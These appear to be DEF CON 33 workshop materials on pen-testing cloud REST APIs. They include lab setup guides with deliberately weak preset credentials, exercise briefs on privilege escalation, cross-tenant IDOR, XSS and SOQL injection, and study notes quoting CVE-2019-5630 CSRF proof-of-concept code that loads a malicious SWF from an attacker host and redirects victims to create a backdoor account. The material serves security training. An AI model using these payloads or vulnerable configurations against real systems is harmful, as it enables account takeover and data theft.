---
title: "Pen-testing Cloud REST APIs"
speakers: ["Rodney Beede"]
conference: "DEF CON"
conference_full: "DEF CON 33"
year: 2025
source_type: "workshop-materials"
source_dir: "DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop"
files_included: 24
files_skipped: 18
text_chars: 33807
redacted_secrets: 0
sha256: "eaee765665bab5015d0416ca4035899706c94594cae3e32adaa02d6ddb162a1b"
converted_at: "2026-08-12T06:21:19Z"
---

# Pen-testing Cloud REST APIs

**Speakers:** Rodney Beede  
**Conference:** DEF CON 33 (workshop materials)  
**Contents:** 24 readable files inlined below. This is the workshop's own source material, not slide text — no OCR is involved, so the code is exact.

## Files not inlined

Binaries and oversized artefacts, listed for completeness:

- `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/.gitignore` — 4 KB (binary)
- `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/exercises/xss-exercise-sample-screenshot.png` — 58 KB (binary)
- `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/server_setup/OpenStack/openstack-demo/demo-testdata/fyi emoji.png` — 2 KB (binary)
- `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/server_setup/OpenStack/openstack-demo/demo-testdata/initials profile picture - small.png` — 3 KB (binary)
- `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/server_setup/OpenStack/openstack-demo/demo-testdata/regionallogo-2020-weeblyheader_orig.png` — 21 KB (binary)
- `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/server_setup/OpenStack/openstack-demo/demo-testdata/sugarskull-2019_orig.png` — 151 KB (binary)
- `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/study_material/img/ai_generated_trainer_image.png` — 1870 KB (binary)
- `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/study_material/img/not_xss_1.png` — 39 KB (binary)
- `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/study_material/img/not_xss_2.png` — 62 KB (binary)
- `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/study_material/img/not_xss_3.png` — 29 KB (binary)
- `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/study_material/img/paas_cloud_goat.png` — 269 KB (binary)
- `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/study_material/img/why_salesforce_testing1.png` — 102 KB (binary)
- `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/study_material/img/why_salesforce_testing2.png` — 792 KB (binary)
- `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/study_material/img/why_salesforce_testing3.png` — 293 KB (binary)
- `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/study_material/img/why_salesforce_testing4.png` — 385 KB (binary)
- `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/study_material/img/why_salesforce_testing5.png` — 144 KB (binary)
- `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/study_material/img/xss_backdoor_via_api_ui.png` — 55 KB (binary)
- `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/workshop_event/Pen-Testing Cloud REST APIs - 2025.pptx` — 423 KB (binary)

## Materials

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/README.md`

```markdown
# Pen-testing Cloud APIs: Workshop

An updated collection of resources used for a workshop on penetration testing of cloud APIs. This version consolidates multiple cloud technologies into a training workshop for application security penetration testing of multiple clouds.

##### Major Updates
- Dropped support for Windows Powershell/CMD
  - Linux is simply much faster for setup during a workshop
- More prominent examples of using the gcloud clients for API pen testing
- Updated deployment tools and instructions to allow each workshop trainee to run everything locally

#### What's Covered
- Hacking a simulated vulnerable Google Cloud REST API
- Hacking a simulated vulnerable OpenStack Swift API
  - Including how to use the vulnerability to attack web GUIs
- Hacking a simulated vulnerable Salesforce Cloud App

##### Not Covered
- Azure - work-in-progress 📋
- AWS - Does not have a public bug bounty reward program
  - https://aws.amazon.com/security/vulnerability-reporting/
  - HackerOne for Amazon (retail)
    - https://hackerone.com/amazonvrp
	- > All AWS related services and products will be out-of-scope

## Workshop Structure
1. [Study Material](documentation/study_material/README.md)
   - Highlevel summary of concepts important for pen testing APIs
   - More detailed explanations and examples for each high-level objective
1. [Server Simulator Setup](documentation/server_setup/)
   - Technical steps for setup of the emulated cloud-service (server) components
   - Permits take-home testing outside of the workshop material as well as reducing dependency on a working workshop conference Internet connection
1. [Client-side Setup](documentation/client_setup/)
   - Important details on required software for the pen tester
   - Lesson material for how to get working cloud REST API calls into pen testing tools
1. [Exercises](documentation/exercises/README.md)
   - Privilege Escalation
   - IDOR/Confused Deputy to steal another tenant's (customer's) data
   - Leveraging XSS via an API
   - Bypass field encryption using injection vulnerabilities to access restricted data
  
## Where to Start
1. Setup the server simulator infrastructure
1. Setup your local pen testing client software
1. Begin in the [Exercises](documentation/exercises/README.md) section

---

##### Previous Work
- [PaaS Cloud Goat (Hacking Salesforce Apps)](https://github.com/rbeede/paas-cloud-goat)
  - https://defcon.org/html/defcon-32/dc-32-workshops.html#54228
- [Cloud AuthoriZation Trainer](https://github.com/rbeede/cazt)
  - https://www.blackhat.com/us-23/arsenal/schedule/#cloud-authz-trainer-cazt-33486
- [OpenStack API Hacking](https://github.com/rbeede/BSidesSATX2023)

##### Author Bio
- https://www.rodneybeede.com/curriculum%20vitae/bio.html

Workshop was publicly released for Def Con 33 Workshops - August 2025
```

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/client_setup/Burp_linux.md`

````markdown
# Burp Setup

```shell
export https_proxy="http://localhost:8080"

curl --output burp-ca.der http://localhost:8080/cert

openssl x509 -inform der -in burp-ca.der -out burp-ca.cer

pwd

# GCloud CLI does validate no self-signed certificates and the CN/Subject match as expected
export CLOUDSDK_CORE_custom_ca_certs_file="`pwd`/burp-ca.cer"

# Alternative is to disable validation entirely but you do get annoying warning messages
#	gcloud config set auth/disable_ssl_validation  True

# Another gcloud alternative would be a custom profile with a gcloud config for custom_ca_certs_file
# Environment variables are handy so you can easily open a new tab with no Burp applied to test connections


# For Python3
export REQUESTS_CA_BUNDLE="`pwd`/burp-ca.cer"
```
````

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/client_setup/CAZT-gcloud_lab-command-line_linux.md`

````markdown
# Prerequisites

- Python3 installed
- gcloud CLI installed (https://cloud.google.com/sdk/docs/install#linux)
  - Also the `gcloud` command must be available in the system path
  - Note that download and install of gcloud can be slow
  - You may want the .tar.gz version instead (https://cloud.google.com/sdk/docs/install#linux)
  - Use of the docker image can result in sandboxing making it more difficult to attach Burp
- Download of `git clone https://github.com/Coalfire-Research/cazt.git`
  - Alt: `curl -O https://github.com/Coalfire-Research/cazt/archive/refs/heads/main.zip`

## Establish service address

Change to workshop IP address if you can't get it to run locally:
```shell
# Change address if using workshop specific server
export LAB_IP=cazt.us-texas-9.cloud.localtest.me

ping -c 2 $LAB_IP
```

## Add Python dependencies (some platforms)

#### Ubuntu

```shell
sudo apt install -y python3-venv
```

---

# Burp Setup

[See Burp Doc](Burp_linux.md)

---

# Add CAZT simulation API into the gcloud-cli

```shell
python3 -m venv venv

source venv/bin/activate

pushd cazt/trainee/cloud-clients/gcloud/

pwd

sudo python3 install-cazt-into-gcloud-cli.py

deactivate

popd

pwd
```

Validate with
```shell
gcloud cazt --help
```

---

# Start the simulator server

1. Open a new tab (and keep it open)
   - Burp env variables should _not_ be configured
1. Use the following instructions
   - _Based on the main project https://github.com/Coalfire-Research/cazt_

```shell
cd cazt/

python3 -m venv venv

source venv/bin/activate

pip3 install -r requirements.txt

# It is normal if this is currently empty, for future use
```

```shell
cd simulator/

bash x509/generate-self-signed.bash

ip address show

python3 main_http_endpoint_server.py
```

Leave the server running.

---

# Populate Sample Test Data

In your terminal/shell/tab with Burp environment setup.

```shell
gcloud cazt create \
    --api-endpoint-overrides=https://$LAB_IP:8443/uat \
    --account=cazt_scen0_Setup-Any@000000001111 \
    --format json \
    --name=MyMoggy \
    --activity-log-object-storage=moggylitterbox-000000001111
```

```shell
gcloud cazt create \
    --api-endpoint-overrides=https://$LAB_IP:8443/uat \
    --account=cazt_scen0_Setup-Any@000000002222  \
    --format json \
    --name=NotMyMoggy \
    --activity-log-object-storage=moggylitterbox-000000002222
```

```shell
gcloud cazt run-activity \
    --api-endpoint-overrides=https://$LAB_IP:8443/uat \
	--account=cazt_scen0_Setup-Any@000000001111 \
	--format json \
	--arn=arn:cloud:cazt:us-texas-9:000000001111:MyMoggy
```

You now have two tenants (customers) accounts with sample data in them:
- Account 000000001111 with MyMoggy
- Account 000000002222 with NotMyMoggy
````

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/client_setup/OpenStack_lab-command-line_linux.md`

````markdown
# OpenStack Lab Client Setup

_Server setup found in the [server setup section](../server_setup/)_


## Setup environment variable
```shell
export LAB_OPENSTACK_IP=127.0.0.1
```

##### Alternative workshop backup server
`#	export LAB_OPENSTACK_IP=203.0.113.10`

## Setup a directory to create files and work out of
```shell
mkdir -p OpenStack
cd OpenStack
```

## Verify Connectivity

```shell
ping -c 2 $LAB_OPENSTACK_IP

```

```shell
curl --insecure --include https://${LAB_OPENSTACK_IP}:8888/healthcheck
```

You should get back a response indicating the service is responding.

---

## Setup the official OpenStack Swift CLI tool

_Distro specific method_

```shell
sudo apt install python3-swiftclient
```

##### Optional venv
```shell
sudo apt-get install python3-venv python3-pip

python3 -m venv venv

pip install python-swiftclient
```

##### You might have to add the installed binary directory to your path
```shell
export PATH=$PATH:$HOME/.local/bin
```

## Validate the CLI can reach the simulator server

```shell
swift --insecure --auth=https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U system:root -K testpass --verbose stat
```
## Burp Setup commands

```shell
export https_proxy=http://localhost:8080
```

[Alternative CA cert method](Burp_linux.md)

##### Repeat test command with Burp HTTP proxy in-place
```shell
swift --insecure --auth=https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U system:root -K testpass --verbose stat
```


## Verify file uploads work

```shell
echo $USER > sample_object.txt

swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U system:root -K testpass upload bsides-workshop sample_object.txt

swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U system:root -K testpass list
```

## Prepare sample data for XSS exercise

```shell
echo $USER > sample_object.txt

swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U system:root -K testpass upload fileuploads ./sample_object.txt
```
````

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/exercises/README.md`

```markdown
# Exercises

These are a selection of select exercises to perform in the workshop. The underlying simulator platforms have their own detailed lab manuals and additional exercises that you can also explore beyond this workshop.

---

Successful completion of each exercise occurs you when 

1. [Privilege Escalation](priv_esc.md) - Bypass the IAM authorization policy to get admin
1. [IDOR/Confused Deputy](idor.md) - Steal another tenant's (customer's) data
1. [Leveraging XSS via an API](xss.md) - Get XSS on a running web UI
1. [Bypass field encryption](encryption_bypass.md) - Use an injection vulnerability to access restricted data
```

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/exercises/encryption_bypass.md`

```markdown
# Encryped Field Data Access Bypass

## Salesforce

You can perform a deployment of the [PaaS Cloud Goat](https://github.com/Coalfire-Research/paas-cloud-goat) to a Salesforce Developer Edition organization. Ensure that you pre-populate sample test data as per the [Install](https://github.com/Coalfire-Research/paas-cloud-goat/blob/main/Documentation/INSTALL.md) instructions.

The live workshop will provide a pre-deployed test environment for you.

The end goal is to retrieve the cleartext data from the encrypted field as a standard user using an SOQL injection bypass.

### Tips:

- Use the SOQLInjection3 example for your exploit attempts.
```

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/exercises/idor.md`

````markdown
# IDOR / Confused Deputy

## Google Cloud via CAZT

Following the challenge at:
https://github.com/Coalfire-Research/cazt/blob/main/documentation/lab_manual/scenarios/02-cross_tenant.md

The end goal is to call the GetMoggy API from the attacker's ` --account=cazt_scen2_cross-tenant@123456789012` to get the resource that belongs to the victim in account 000000002222. A response that looks like:
```
{
  "ActivityLogObjectStorage": "moggylitterbox-000000002222",
  "CreatedAt": 1751213493,
  "Description": null,
  "Name": "NotMyMoggy"
}
```

### Tips:

- Identify which input(s) you want to attack to exploit
- Note: You are attacking the authorization, not the authentication
- How can an input be manipulated to fool a service into accessing the wrong thing?
````

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/exercises/priv_esc.md`

````markdown
# Privilege Escalation

## Google Cloud via CAZT

Following the challenge at:
https://github.com/Coalfire-Research/cazt/blob/main/documentation/lab_manual/scenarios/07-impersonation.md

The end goal is to get a response that looks like:

```json
{
  "Message": "123456789012 using impersonation arn:cloud:iam:us-texas-9:123456789012:FullAdmin"
}
```

### Tips:

- Based on the IAM policy can you get a baseline QA response by making an expected legitimate request with expected inputs?
- Identify which input(s) you want to attack to exploit privilege escalation
- Note: You are attacking the authorization, not the authentication
````

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/exercises/xss.md`

```markdown
# Cross-site Scripting (XSS)

## OpenStack

Ensure that all setup per [](../client_setup/OpenStack_lab-command-line_linux.md) is complete.

The end goal is to get successful XSS in a web browser.
![image](xss-exercise-sample-screenshot.png)

## URL of frontend:

`http://${LAB_OPENSTACK_IP}:9080/REST/API/endpoint.cgi`

## Tips:

- If a front-end UI denies uploads where might it miss?
- https://docs.openstack.org/ocata/cli-reference/swift.html
- Remember: Object Storage != Filesystem Storage nor the same limitations
  - https://docs.openstack.org/api-ref/object-store/index.html#objects
```

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/server_setup/OpenStack/OpenStack_Swift_server_setup.md`

````markdown
# OpenStack Swift Simulated Vulnerable Server

Tested on Ubuntu 24.04 x86_64

Pre-setup virtual machine images are available in the repository releases page: https://github.com/rbeede/pen-testing-cloud-apis/releases

---

## Setup Steps

1. Ensure you have approximately 6GiB of free space
1. Ensure your distro has the tools for XFS filesystem support
   - WSL2 by default does not
   - `sudo apt install xfsprogs`
   - `sudo modprobe -v xfs`
1. Do not run hese setup steps while proxying through Burp
1. Clone the workshop repo
1. Go into the `documentation/server_setup/OpenStack/` folder

`sudo bash lab-server_openstack_install.bash`

## Startup Steps

### OpenStack Swift

1. Objects will be persisted upon reboot
1. After a reboot login to the server and execute
   - `sudo swift-init all start`
   - It is safe to ignore Unable to find XXX config section messages

### Web UI Simulated App
   
The simulated web UI should be run on the same server where swift is running and started as follows:
1. Start a `screen` session so the server persists
1. You do _not_ need to be root
1. `cd documentation/server_setup/OpenStack/`
1. `python3 xss_python_swift_rest_api_server.py 9080`

## Reset workshop data

If you need a fresh start you can clear the data with

```shell
swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U system:root -K testpass delete fileuploads

swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U account1:normal -K expected delete deptdocs

swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U account2:somebody -K else delete research 

swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U codeerror:unexpecteduser -K shouldnothappen delete warez
```

## (Re)create workshop test data

If you did a fresh start and want the exercise data to be available:

```shell
# From the workshop repo you cloned
pushd documentation/server_setup/OpenStack/openstack-demo/demo-testdata/
```

```shell

echo $USER > sample_object.txt

swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U system:root -K testpass upload bsides-workshop sample_object.txt


# setup XSS example

swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U system:root -K testpass upload fileuploads sample_object.txt

swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U system:root -K testpass upload fileuploads sugarskull-2019_orig.png


# setup IAM examples

# Base check that accounts work

swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U account1:normal -K expected list
swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U account2:somebody -K else list
swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U codeerror:unexpecteduser -K shouldnothappen list


# Setup default uploads
swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U account1:normal -K expected upload deptdocs sugarskull-2019_orig.png
swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U account1:normal -K expected upload deptdocs sample_object.txt

swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U account2:somebody -K else upload research super-secret-doc-for-account2-only.txt
swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U account2:somebody -K else upload research "initials profile picture - small.png"
swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U account2:somebody -K else upload research "fyi emoji.png"

# Hacker account
swift --insecure -A https://${LAB_OPENSTACK_IP}:8888/auth/v1.0 -U codeerror:unexpecteduser -K shouldnothappen upload warez pumpkin.JPG
```


```shell
popd
```
````

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/server_setup/OpenStack/lab-server_openstack_install.bash`

```bash
# A self-contained Swift deployment with some preset credentials for the lab. Assumes Ubuntu/Debian package manager apt.

# SAIO documentation was very out of date and assumed dev work on swift itself
# Modified build with Ubuntu 24.04 LTS Server 64-bit
#	http://greenstack.die.upm.es/2015/06/02/openstack-essentials-part-2-installing-swift-on-ubuntu/
#

# docker options existed but did not make it easy to modify with a "vuln" API

set -x
set -e


if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root."
    exit 1
fi


SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )


apt-get update

apt-get -y install swift-proxy
apt-get -y install  swift-account swift-container swift-object

apt-get -y install swift

mkdir -p /var/run/swift
chown swift:swift /var/run/swift

mkdir -p /srv/node/vda1
# while NOT mounted, these perms ensure openstack swift only works when successfully started later
chown root:root /srv/node/vda1
chmod 0000 /srv/node/vda1

cd /etc/swift/

openssl req -x509 -newkey rsa:4096 -nodes -out cert.crt -keyout cert.key -days 3653 -subj "/CN=lab.openstack.swift.cloud.localtest.me"

mkdir -p /var/cache/swift && chown swift:swift /var/cache/swift
apt-get -y install memcached

swift-ring-builder account.builder create 7 1 1
swift-ring-builder container.builder create 7 1 1
swift-ring-builder object.builder create 7 1 1
export ZONE=1
export STORAGE_LOCAL_NET_IP=127.0.0.1
export WEIGHT=100
export DEVICE=vda1
swift-ring-builder account.builder add z$ZONE-$STORAGE_LOCAL_NET_IP:6002/$DEVICE $WEIGHT
swift-ring-builder container.builder add z$ZONE-$STORAGE_LOCAL_NET_IP:6001/$DEVICE $WEIGHT
swift-ring-builder object.builder add z$ZONE-$STORAGE_LOCAL_NET_IP:6000/$DEVICE $WEIGHT
swift-ring-builder account.builder
swift-ring-builder container.builder
swift-ring-builder object.builder

swift-ring-builder account.builder rebalance
swift-ring-builder container.builder rebalance
swift-ring-builder object.builder rebalance


truncate -s 5G /srv/swift-disk
mkfs.xfs /srv/swift-disk

echo "" >> /etc/fstab
echo "/srv/swift-disk	/srv/node/vda1	xfs	loop,noatime	0	0" >> /etc/fstab

mount -a

# WHILE mounted
chown swift:swift /srv/node/vda1




swift-init all stop     || true

#########
#########
## From the repo dir #openstack-demo/etc_swift-confs/# install into /etc/swift/ all the conf files
#########

cp --recursive --verbose --force $SCRIPT_DIR/openstack-demo/etc_swift-confs/* /etc/swift/

chown --recursive root:swift /etc/swift/

chmod u=rw,g=r,o= /etc/swift/*.conf

#########



swift-init all start     || true


echo OpenStack Swift service installed and started, you may need to prepopulate test data
```

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/server_setup/OpenStack/openstack-demo/etc_swift-confs/account-server.conf`

```ini
[DEFAULT]
bind_ip = 127.0.0.1
bind_port = 6002
workers = 2

[pipeline:main]
pipeline = account-server

[app:account-server]
use = egg:swift#account

[account-replicator]

[account-auditor]

[account-reaper]
```

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/server_setup/OpenStack/openstack-demo/etc_swift-confs/container-server.conf`

```ini
[DEFAULT]
bind_ip = 127.0.0.1
bind_port = 6001
workers = 2

[pipeline:main]
pipeline = container-server

[app:container-server]
use = egg:swift#container

[container-replicator]

[container-updater]

[container-auditor]

[container-sync]
```

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/server_setup/OpenStack/openstack-demo/etc_swift-confs/object-expirer.conf`

```ini
[DEFAULT]

[object-expirer]
interval = 300

[pipeline:main]
pipeline = catch_errors cache proxy-server

[app:proxy-server]
use = egg:swift#proxy

[filter:cache]
use = egg:swift#memcache

[filter:catch_errors]
use = egg:swift#catch_errors

# See object-expirer.conf-sample for options
```

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/server_setup/OpenStack/openstack-demo/etc_swift-confs/object-server.conf`

```ini
[DEFAULT]
bind_ip = 127.0.0.1
bind_port = 6000
workers = 2

[pipeline:main]
pipeline = object-server

[app:object-server]
use = egg:swift#object

[object-replicator]

[object-updater]

[object-auditor]
```

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/server_setup/OpenStack/openstack-demo/etc_swift-confs/proxy-server.conf`

```ini
[DEFAULT]
cert_file = /etc/swift/cert.crt
key_file = /etc/swift/cert.key
bind_port = 8888
workers = 8
user = swift
[pipeline:main]
pipeline = healthcheck proxy-logging cache tempauth proxy-logging proxy-server
[app:proxy-server]
use = egg:swift#proxy
allow_account_management = true
account_autocreate = true
[filter:proxy-logging]
use = egg:swift#proxy_logging

[filter:tempauth]
use = egg:swift#tempauth
user_system_root = testpass .admin 

user_account1_normal = expected .admin
user_account2_somebody = else .admin

user_codeerror_unexpecteduser = shouldnothappen .reseller_admin

[filter:healthcheck]
use = egg:swift#healthcheck
[filter:cache]
use = egg:swift#memcache
memcache_servers = 127.0.0.1:11211
```

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/server_setup/OpenStack/openstack-demo/etc_swift-confs/swift.conf`

```ini
[swift-hash]
swift_hash_path_prefix = bsides
swift_hash_path_suffix = bsides
```

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/study_material/README.md`

````markdown
# Pen-testing Cloud APIs: Study Material

##### Author Bio
- https://www.rodneybeede.com/curriculum%20vitae/bio.html

---

## Cloud Vendor Programs

- AWS
  - No public bug-bounty reward (VRP) program
- Google Cloud
  - _If a vulnerability is found, please report it via the Vulnerability Reward Program._
  - https://bughunters.google.com/
- Microsoft Azure
  - "enable responsible security testing" … "without causing harm"
  - https://www.microsoft.com/en-us/msrc/pentest-rules-of-engagement
  - https://www.microsoft.com/en-us/msrc/bounty
- Salesforce
  - "…invitation-only program…"
  - https://trailhead.salesforce.com/content/learn/modules/salesforce-bug-bounty-program/get-to-know-the-salesforce-bug-bounty-program
  - https://www.salesforce.com/company/legal/disclosure/
- OpenStack
  - Open source accessibility for testing
  - https://security.openstack.org/reporting.html

---

## What Uses Cloud APIs

- Command line tools
  - Some remote client to the API endpoint server
- Servers
  - Some web app calls other services' APIs
  - Example: Web app stores a file upload into Cloud Object Storage via an API call
- Web browsers
  - AJAX / JavaScript

---

## API Authentication (Common)

- Passed in an HTTP header
  - Authorization: Bearer some-token
  - Authorization: Basic cm9kbmV5OnRoYW5rc2ZvcmRlY29kaW5n
  - X-Auth-Token: some-token
  - Cookie: session-id=abcdef1234567890
  - Etc.
  
---

## API Vulnerability Example: CVE-2019-5630

- Endpoint for the API and the Web UI were shared
- API accepted call with Authorization or Cookie headers
- CSRF was possible
- https://www.rodneybeede.com/security/cve-2019-5630.html

# CVE-2019-5630

- Back when Flash was still in browsers
  - Site with malicious csrf.swf
- Send user a redirect to their own Nexpose InsightVM console API
- API endpoint "Content-Type: application/json"
  - Not typically allowed to set this via CSRF (web browser limitation)
  - Flash allowed this however
  - Lesson: **Don't assume** Content-Type is safe enough for CSRF prevention
- Web browser helpfully passed Cookie auth header
- REST API used authenticated session as user to create backdoor account

```javascript
      var url:String = "http://big-mean-attacker.rodneybeede.com:80/";
      var request:URLRequest = new URLRequest(url);
      request.requestHeaders.push(new URLRequestHeader("Content-Type","application/json"));
      request.data = myJson;
      request.method = URLRequestMethod.POST;
```
https://github.com/rbeede/CVE-2019-5630/blob/master/csrf.as#L33

```html
<object width="500" height="500" data="http://big-mean-attacker.rodneybeede.com/csrf.swf"></object>
To see more cute cats "Click to enable Adobe Flash Player"
```

```python
class RedirectHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_POST(s):
       # dir(s)
        if s.path == '/csrf.swf':
           s.send_response(200)
           s.send_header("Content-Type","application/x-shockwave-flash")
           s.end_headers()
           s.wfile.write(open("csrf.swf", "rb").read())
           return 
        elif s.path == '/pause':
           s.send_response(200)
           return
        s.send_response(307)
        s.send_header("Location", "https://rapid7.insightvm.example.com/api/3/users")
        s.end_headers()
```
https://github.com/rbeede/CVE-2019-5630/blob/master/hack-py-redirect-server.py

---

# API Types

- REST
  - HTTP headers play big role
  - HTTP request content payload
    - Popular to see json now
    - Sometimes plain HTTP form encoded data
- XML
  - Popular for SAML
  - Hint: Look for XXE attacks
- SOAP
  - Older, Not as popular today
  - Had WSDL (Web Service Definition Language)
- Some APIs support multiple
  - Example:  AWS S3 supports SOAP and REST

---

# Cloud Shared Responsibility Model

- Customer Responsibility
  - Configuration of customer account settings
  - Applying ACLs to data correctly
  - Customer provided software security
- Cloud Provider Responsibility
  - Infrastructure security
  - Web service (API, UI) code security
  - Data storage security (as specified by customer)
- We will be pen testing the cloud APIs themselves
  - Cloud Provider responsibility

---

# Cloud API Vulnerabilities

- Confused-deputy
  - Mishandled user input & authorization leads to customer data exposure
- Same account ACL (IDOR) bypass
  - Violating an IAM policy
- XSS
  - Reflective not very common (due to content-type) but not impossible
  - Persistent or DOM possible
- SSRF
  - Obtaining access to internal systems
- DoS
  - Causing API to exhaust provider resources
- HTTP 500 Errors
  - More useful than you think
- More: [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)

---

# Discussion: API Input Fuzzing/Tampering

- Param is some type of number?
  - currpage = 1
- Try an unexpected number value
  - currpage = 4294967297
    - 2^32  +  1
  - currpage = -2147483649
    - 2^31 - 1
  - 2^64, 99999999999999999999999999999999999999999999, etc.
- Try no value
  - null, "", None, currpage=&nextparam…
- Did you get an unexpected (HTTP 500) error?

---

# Cloud Vendor Vulns

  - No exact number
    - Internally discovered vulns not published
  - Some public sources:
    - "Google Cloud: Here are the six 'best' vulnerabilities security researchers found last year" ([link](https://www.zdnet.com/article/google-cloud-here-are-the-six-best-vulnerabilities-security-researchers-found-last-year/) – zdnet.com; 2021)
    - Blogs ([https://github.com/hashishrajan/cloud-security-vulnerabilities](https://github.com/hashishrajan/cloud-security-vulnerabilities); 2023)
  - Azure – ~438 CVEs [(link - notcve.org)](https://notcve.org/search.php?query=Azure++vendor%3AMicrosoft)
  - Google Cloud – 206+ ([link](https://cloud.google.com/support/bulletins) – published by google.com)
  - AWS Security Bulletins – 51+ ([link](https://aws.amazon.com/security/security-bulletins/) – published by amazon.com)

These numbers do not mean one vendor is better than another. Just shows vulns do exist.

---

Next - [Authorization Vulnerabilities](auth-vulns.md)
````

### `DEF CON 33 - Workshops - Rodney Beede - Pen-testing Cloud REST APIs - Full Workshop/pen-testing-cloud-apis-main/documentation/study_material/auth-vulns.md`

```markdown

# Cloud AuthoriZation Trainer (CAZT)

